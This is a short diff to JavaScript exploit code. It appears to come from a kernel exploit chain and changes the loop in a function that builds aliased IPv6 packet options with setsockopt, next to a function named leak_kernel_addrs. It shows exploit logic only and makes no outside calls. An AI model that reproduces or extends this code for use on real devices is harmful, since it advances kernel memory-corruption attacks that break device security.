@@ -1786,8 +1786,8 @@ function leak_kernel_addrs(sd_pair) {
 //================================================================================================
 function make_aliased_pktopts(sds) {
   const tclass = new Word();
-  var loop = 0;
-//  for (var loop = 0; loop < num_alias; loop++) {
+  const pktopts_loopcnt = 1;
+  for (var loop = 0; loop < pktopts_loopcnt; loop++) {
     for (var i = 0; i < num_sds; i++) {
       setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
     }
@@ -1814,7 +1814,7 @@ function make_aliased_pktopts(sds) {
         return pair;
       }
     }
-//  }
+  }
   die('failed to make aliased pktopts');
 }
 //================================================================================================
